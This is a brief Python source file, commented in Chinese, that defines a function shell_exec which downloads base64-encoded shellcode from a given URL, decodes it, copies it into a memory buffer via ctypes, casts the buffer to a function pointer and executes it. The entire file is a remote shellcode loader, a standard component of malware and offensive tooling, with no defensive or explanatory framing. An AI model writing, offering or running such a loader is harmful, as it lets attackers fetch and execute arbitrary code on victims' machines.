# encoding: utf-8
"""

"""
import urllib.request
import ctypes
import base64


def shell_exec(url):
    # 从 WEB 服务器下载 shellcode
    response = urllib.request.urlopen(url)
    shellcode = base64.b64decode(response.read())

    # 申请内从空间
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

    # 创建 shellcode_buffer 函数指针
    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

    # 执行 shellcode
    shellcode_func()
